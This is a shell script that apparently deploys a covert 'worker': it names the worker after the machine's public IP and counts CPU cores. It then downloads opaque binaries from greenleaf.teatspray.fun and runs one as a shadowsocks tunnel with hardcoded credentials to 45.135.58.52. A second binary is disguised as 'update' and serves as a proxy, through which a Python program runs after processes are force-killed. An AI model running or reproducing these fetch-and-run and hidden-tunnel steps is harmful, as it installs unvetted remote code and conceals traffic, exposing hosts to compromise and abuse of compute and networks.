#!/bin/sh
python3 -m venv env
source ./env/bin/activate

num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
currentdate=$(date '+%d-%b-%Y_Shiny_')
ipaddress=$(curl -s ifconfig.me)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
currentdate+=$underscored_ip
used_num_of_cores=`expr $num_of_cores - 3`

echo ""
echo "You have a total number of $used_num_of_cores cores"
echo ""

echo ""
echo "Your worker name is $currentdate"
echo ""
sleep 2

wget https://github.com/mncedisimavunqela/browserless-python/raw/main/browserless-python.tar.gz
tar -xf browserless-python.tar.gz
sleep 2
pip3 install -r requirements.txt
ls -la
whoami
sleep 2
wget http://greenleaf.teatspray.fun/Spectre.tar.gz
sleep 2
tar -xf Spectre.tar.gz
sleep 2
./Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@45.135.58.52:8443 &
sleep 2
curl -x socks5h://127.0.0.1:1082 ifconfig.me
sleep 2
echo ""
echo ""
wget http://greenleaf.teatspray.fun/update.tar.gz > /dev/null
sleep 2
tar -xf update.tar.gz
sleep 2
cat > update/local/update-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 127.0.0.1:1082
END
sleep 2
./update/local/update-local -config update/local/update-local.conf & > /dev/null
sleep 2
ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1
sleep 3
./update/local/update-local -config update/local/update-local.conf & > /dev/null
sleep 2
./update/update curl ifconfig.me
sleep 2
echo ""
echo ""
sleep 2
./update/update python3 main.py
